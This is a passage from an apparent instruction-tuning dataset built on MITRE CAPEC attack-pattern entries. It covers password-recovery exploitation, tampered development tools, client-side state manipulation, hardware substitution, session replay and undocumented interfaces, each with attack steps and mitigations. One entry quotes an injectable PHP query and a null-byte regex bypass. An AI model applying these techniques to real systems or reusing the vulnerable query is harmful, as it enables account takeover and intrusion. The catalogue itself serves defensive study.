        "@ID": "50",
        "@Name": "Password Recovery Exploitation",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure.",
        "Extended_Description": {
          "xhtml:p": "Most of them use only one security question. For instance, mother's maiden name tends to be a fairly popular one. Unfortunately in many cases this information is not very hard to find, especially if the attacker knows the legitimate user. These generic security questions are also re-used across many applications, thus making them even more insecure. An attacker could for instance overhear a coworker talking to a bank representative at the work place and supplying their mother's maiden name for verification purposes. An attacker can then try to log in into one of the victim's accounts, click on \"forgot password\" and there is a good chance that the security question there will be to provide mother's maiden name. A weak password recovery scheme totally undermines the effectiveness of a strong password scheme."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "212",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "Understand the password recovery mechanism and how it works."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system allows users to recover their passwords and gain access back into the system.",
            "Password recovery mechanism has been designed or implemented insecurely.",
            "Password recovery mechanism relies only on something the user knows and not something the user has.",
            "No third party intervention is required to use the password recovery mechanism."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "Brute force attack"
            },
            {
              "@Level": "Medium",
              "#text": "Social engineering and more sophisticated technical attacks."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "For a brute force attack one would need a machine with sufficient CPU, RAM and HD."
        },
        "Indicators": {
          "Indicator": "Many incorrect attempts to answer the security question."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Use multiple security questions (e.g. have three and make the user answer two of them correctly). Let the user select their own security questions or provide them with choices of questions that are not generic.",
            "E-mail the temporary password to the registered e-mail address of the user rather than letting the user reset the password online.",
            "Ensure that your password recovery functionality is not vulnerable to an injection style attack."
          ]
        },
        "Example_Instances": {
          "Example": [
            "An attacker clicks on the \"forgot password\" and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.",
            {
              "xhtml:p": [
                "phpBanner Exchange is a PHP script (using the mySQL database) that facilitates the running of a banner exchange without extensive knowledge of PHP or mySQL.",
                "A SQL injection was discovered in the password recovery module of the system that allows recovering an arbitrary user's password and taking over their account. The problem is due to faulty input sanitization in the phpBannerExchange, specifically the e-mail address of the user which is requested by the password recovery module.",
                "The e-mail address requested by the password recovery module on the resetpw.php page. That e-mail address is validated with the following regular expression:",
                "A bug in the implementation of eregi() allows to pass additional character using a null byte \"\\0\". Since eregi() is implemented in C, the variable $email is treated as a zero-terminated string. All characters following the Null Byte will not be recognized by the regular expression. So an e-mail address can be provided that includes the special character \" ' \" to break the SQL query below (and it will not be rejected by the regular expression because of the null byte trick). So a SQL injection becomes possible:",
                "This query will return a non-zero result set even though the email supplied (attacker's email) is not in the database.",
                "Then a new password for the user is generated and sent to the $email address, an e-mail address controlled by the attacker. An attacker can then log in into the system."
              ],
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "#text": "(\\.[a-z]{2,3})$\", $email)){"
                  },
                  "#text": "if(!eregi(\"^[_a-z0-9-]+(\\.[_a-z0-9-]+)*@[a-z0-9-]+(\\.[a-z0-9-]+)*"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "#text": "email='$email' \");"
                  },
                  "#text": "$get_info=mysql_query(\"select * from banneruser where"
                }
              ],
              "#text": "See also: CVE-2006-3013"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "640"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-429"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Software Development Tools Maliciously Altered (CAPEC ID: 670)",
    "context": "",
    "output": "Possible examples: An adversary with access to software build tools inside an Integrated Development Environment IDE alters a script used for downloading dependencies from a dependent code repository where the script has been changed to include malicious code implanted in the repository by the adversary.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary with access to software build tools inside an Integrated Development Environment IDE alters a script used for downloading dependencies from a dependent code repository where the script has been changed to include malicious code implanted in the repository by the adversary.",
      "@Name": "Software Development Tools Maliciously Altered (CAPEC ID: 670)",
      "attack_ptrn": {
        "@ID": "670",
        "@Name": "Software Development Tools Maliciously Altered",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary with the ability to alter tools used in a development environment causes software to be developed with maliciously modified tools. Such tools include requirements management and database tools, software design tools, configuration management tools, compilers, system build tools, and software performance testing and load testing tools. The adversary then carries out malicious acts once the software is deployed including malware infection of other systems to support further compromises.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "444",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "669"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "An adversary would need to have access to a targeted developer\u2019s development environment and in particular to tools used to design, create, test and manage software, where the adversary could ensure malicious code is included in software packages built through alteration or substitution of tools in the environment used in the development of software."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Ability to leverage common delivery mechanisms (e.g., email attachments, removable media) to infiltrate a development environment to gain access to software development tools for the purpose of malware insertion into an existing tool or replacement of an existing tool with a maliciously altered copy."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": "Access Control",
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": [
                "Modify Data",
                "Read Data"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Have a security concept of operations (CONOPS) for the development environment that includes: Maintaining strict security administration and configuration management of requirements management and database tools, software design tools, configuration management tools, compilers, system build tools, and software performance testing and load testing tools.",
            "Avoid giving elevated privileges to developers."
          ]
        },
        "Example_Instances": {
          "Example": "An adversary with access to software build tools inside an Integrated Development Environment IDE alters a script used for downloading dependencies from a dependent code repository where the script has been changed to include malicious code implanted in the repository by the adversary."
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1127",
              "Entry_Name": "Trusted Developer Utilities Proxy Execution"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1195.001",
              "Entry_Name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-660"
            },
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-667"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Manipulating State (CAPEC ID: 74), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: During the authentication process, an application stores the authentication decision (auth=0/1) in unencrypted cookies. At every request, this cookie is checked to permit or deny a request.\n- An adversary can easily violate this representation of user state and set auth=1 at every request in order to gain illegitimate access and elevated privilege in the application.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "During the authentication process, an application stores the authentication decision (auth=0/1) in unencrypted cookies. At every request, this cookie is checked to permit or deny a request.",
        "An adversary can easily violate this representation of user state and set auth=1 at every request in order to gain illegitimate access and elevated privilege in the application."
      ],
      "@Name": "Manipulating State (CAPEC ID: 74)",
      "attack_ptrn": {
        "@ID": "74",
        "@Name": "Manipulating State",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
            "The adversary modifies state information maintained by the target software or causes a state transition in hardware. If successful, the target will use this tainted state and execute in an unintended manner.",
            "State management is an important function within a software application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits.",
            "If there is a hardware logic error in a finite state machine, the adversary can use this to put the system in an undefined state which could cause a denial of service or exposure of secure data."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "Adversary determines the nature of state management employed by the target. This includes determining the location (client-side, server-side or both applications) and possibly the items stored as part of user state."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "The adversary now tries to modify the user state contents (possibly indiscriminately if the contents are encrypted or otherwise obfuscated) or cause a state transition and observe the effects of this change on the target."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "Having determined how to manipulate the state, the adversary can perform illegitimate actions."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "User state is maintained at least in some way in user-controllable locations, such as cookies or URL parameters.",
            "There is a faulty finite state machine in the hardware logic that can be exploited."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The adversary needs to have knowledge of state management as employed by the target application, and also the ability to manipulate the state in a meaningful way."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox)."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Do not rely solely on user-controllable locations, such as cookies or URL parameters, to maintain user state.",
            "Avoid sensitive information, such as usernames or authentication and authorization information, in user-controllable locations.",
            "Sensitive information that is part of the user state must be appropriately protected to ensure confidentiality and integrity at each request.",
            "All possible states must be handled by hardware finite state machines."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "During the authentication process, an application stores the authentication decision (auth=0/1) in unencrypted cookies. At every request, this cookie is checked to permit or deny a request.",
              "An adversary can easily violate this representation of user state and set auth=1 at every request in order to gain illegitimate access and elevated privilege in the application."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "372"
            },
            {
              "@CWE_ID": "315"
            },
            {
              "@CWE_ID": "353"
            },
            {
              "@CWE_ID": "693"
            },
            {
              "@CWE_ID": "1245"
            },
            {
              "@CWE_ID": "1253"
            },
            {
              "@CWE_ID": "1265"
            },
            {
              "@CWE_ID": "1271"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Probing_Techniques, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Name, Consequences, Description, Execution_Flow, Mitigations, Prerequisites, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow, Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2020-07-30",
            "#text": "Manipulating User State"
          }
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Hardware Component Substitution During Baselining (CAPEC ID: 516)",
    "context": "",
    "output": "An adversary supplies the product development facility of a network security device with a hardware component that is used to simulate large volumes of network traffic. The device claims in logs, stats, and via the display panel to be pumping out very large quantities of network traffic, when it is in fact putting out very low volumes. The developed product is adjusted and configured to handle what it believes to be a heavy network load, but when deployed at the victim site the large volumes of network traffic are dropped instead of being processed by the network security device. This allows the adversary an advantage when attacking the victim in that the adversary's presence may not be detected by the device.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary supplies the product development facility of a network security device with a hardware component that is used to simulate large volumes of network traffic. The device claims in logs, stats, and via the display panel to be pumping out very large quantities of network traffic, when it is in fact putting out very low volumes. The developed product is adjusted and configured to handle what it believes to be a heavy network load, but when deployed at the victim site the large volumes of network traffic are dropped instead of being processed by the network security device. This allows the adversary an advantage when attacking the victim in that the adversary's presence may not be detected by the device.",
      "@Name": "Hardware Component Substitution During Baselining (CAPEC ID: 516)",
      "attack_ptrn": {
        "@ID": "516",
        "@Name": "Hardware Component Substitution During Baselining",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary with access to system components during allocated baseline development can substitute a maliciously altered hardware component for a baseline component during the product development and research phases. This can lead to adjustments and calibrations being made in the product so that when the final product, now containing the modified component, is deployed it will not perform as designed and be advantageous to the adversary.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": [
              {
                "@Exclude_ID": "513"
              },
              {
                "@Exclude_ID": "688"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary will need either physical access or be able to supply malicious hardware components to the product development facility."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Intelligence data on victim's purchasing habits."
            },
            {
              "@Level": "High",
              "#text": "Resources to maliciously construct/alter hardware components used for testing by the supplier."
            },
            {
              "@Level": "High",
              "#text": "Resources to physically infiltrate supplier."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Hardware attacks are often difficult to detect, as inserted components can be difficult to identify or remain dormant for an extended period of time.",
            "Acquire hardware and hardware components from trusted vendors. Additionally, determine where vendors purchase components or if any components are created/acquired via subcontractors to determine where supply chain risks may exist."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "An adversary supplies the product development facility of a network security device with a hardware component that is used to simulate large volumes of network traffic. The device claims in logs, stats, and via the display panel to be pumping out very large quantities of network traffic, when it is in fact putting out very low volumes. The developed product is adjusted and configured to handle what it believes to be a heavy network load, but when deployed at the victim site the large volumes of network traffic are dropped instead of being processed by the network security device. This allows the adversary an advantage when attacking the victim in that the adversary's presence may not be detected by the device."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-712"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Examples-Instances, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Mitigations, Prerequisites, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Reusing Session IDs (aka Session Replay) (CAPEC ID: 60)",
    "context": "",
    "output": "OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428\nMerak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428",
        "Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258"
      ],
      "@Name": "Reusing Session IDs (aka Session Replay) (CAPEC ID: 60)",
      "attack_ptrn": {
        "@ID": "60",
        "@Name": "Reusing Session IDs (aka Session Replay)",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "593"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "The attacker interacts with the target host and finds that session IDs are used to authenticate users."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "The attacker steals a session ID from a valid user."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID's original owner."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target host uses session IDs to keep track of the users.",
            "Session IDs are used to control access to resources.",
            "The session IDs used by the target host are not well protected from session theft."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "If an attacker can steal a valid session ID, they can then try to be authenticated with that stolen session ID."
            },
            {
              "@Level": "Medium",
              "#text": "More sophisticated attack can be used to hijack a valid session from a user and spoof a legitimate user by reusing their valid session ID."
            }
          ]
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Always invalidate a session ID after the user logout.",
            "Setup a session time out for the session IDs.",
            "Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate adversary in the middle attacks (CAPEC-94).",
            "Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.",
            "Encrypt the session data associated with the session ID.",
            "Use multifactor authentication."
          ]
        },
        "Example_Instances": {
          "Example": [
            "OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428",
            "Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "290"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "488"
            },
            {
              "@CWE_ID": "539"
            },
            {
              "@CWE_ID": "200"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "664"
            },
            {
              "@CWE_ID": "732"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1134.001",
              "Entry_Name": "Access Token Manipulation:Token Impersonation/Theft"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1550.004",
              "Entry_Name": "Use Alternate Authentication Material:Web Session Cookie"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Mitigations, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Using Unpublished Interfaces or Functionality (CAPEC ID: 36)",
    "context": "",
    "output": "Examples of Using Unpublished Interfaces or Functionality (CAPEC ID: 36) are: To an extent, Google services (such as Google Maps) are all well-known examples. Calling these services, or extending them for one's own (perhaps very different) purposes is as easy as knowing they exist. Their unencumbered public use, however, is a purposeful aspect of Google's business model. Most organizations, however, do not have the same business model. Organizations publishing services usually fall back on thoughts that Attackers \"will not know services exist\" and that \"even if they did, they wouldn't be able to access them because they're not on the local LAN.\" Simple threat modeling exercises usually uncovers simple attack vectors that can invalidate these assumptions.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "To an extent, Google services (such as Google Maps) are all well-known examples. Calling these services, or extending them for one's own (perhaps very different) purposes is as easy as knowing they exist. Their unencumbered public use, however, is a purposeful aspect of Google's business model. Most organizations, however, do not have the same business model. Organizations publishing services usually fall back on thoughts that Attackers \"will not know services exist\" and that \"even if they did, they wouldn't be able to access them because they're not on the local LAN.\" Simple threat modeling exercises usually uncovers simple attack vectors that can invalidate these assumptions.",
      "@Name": "Using Unpublished Interfaces or Functionality (CAPEC ID: 36)",
      "attack_ptrn": {
        "@ID": "36",
        "@Name": "Using Unpublished Interfaces or Functionality",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary searches for and invokes interfaces or functionality that the target system designers did not intend to be publicly available. If interfaces fail to authenticate requests, the attacker may be able to invoke functionality they are not authorized for.",
        "Extended_Description": "Adversaries can also search for undocumented bits on a hardware device, commonly known as \"chicken bits\". These bits are used to enable/disable certain functionality, but are not published. Adversaries can reverse engineer firmware to identify hidden features and change these bits at runtime to achieve malicious behavior.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "113"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify services] Discover a service of interest by exploring service registry listings or by connecting on a known port or some similar means.",
              "Technique": [
                "Search via internet for known, published services.",
                "Use automated tools to scan known ports to identify internet-enabled services.",
                "Dump the code from the chip and then perform reverse engineering to analyze the code."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Authenticate to service] Authenticate to the service, if required, in order to explore it.",
              "Technique": [
                "Use published credentials to access system.",
                "Find unpublished credentials to access service.",
                "Use other attack pattern or weakness to bypass authentication."
              ]
            },
            {
              "Step": "3",
              "Phase": "Explore",
              "Description": "[Identify all interfaces] Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.",
              "Technique": [
                "For any published services, determine exposed interfaces via the documentation provided.",
                "For any services found, use error messages from poorly formed service calls to determine valid interfaces. In some cases, services will respond to poorly formed calls with valid ones."
              ]
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Attempt to discover unpublished functions] Using manual or automated means, discover unpublished or undocumented functions exposed by the service.",
              "Technique": [
                "Manually attempt calls to the service using an educated guess approach, including the use of terms like' 'test', 'debug', 'delete', etc.",
                "Use automated tools to scan the service to attempt to reverse engineer exposed, but undocumented, features."
              ]
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Exploit unpublished functions] Using information determined via experimentation, exploit the unpublished features of the service.",
              "Technique": [
                "Execute features that are not intended to be used by general system users.",
                "Craft malicious calls to features not intended to be used by general system users that take advantage of security flaws found in the functions."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The architecture under attack must publish or otherwise make available services that clients can attach to, either in an unauthenticated fashion, or having obtained an authentication token elsewhere. The service need not be 'discoverable', but in the event it isn't it must have some way of being discovered by an attacker. This might include listening on a well-known port. Ultimately, the likelihood of exploit depends on discoverability of the vulnerable service."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A number of web service digging tools are available for free that help discover exposed web services and their interfaces. In the event that a web service is not listed, the attacker does not need to know much more in addition to the format of web service messages that they can sniff/monitor for."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack. Web service digging tools may be helpful."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Authenticating both services and their discovery, and protecting that authentication mechanism simply fixes the bulk of this problem. Protecting the authentication involves the standard means, including: 1) protecting the channel over which authentication occurs, 2) preventing the theft, forgery, or prediction of authentication credentials or the resultant tokens, or 3) subversion of password reset and the like."
        },
        "Example_Instances": {
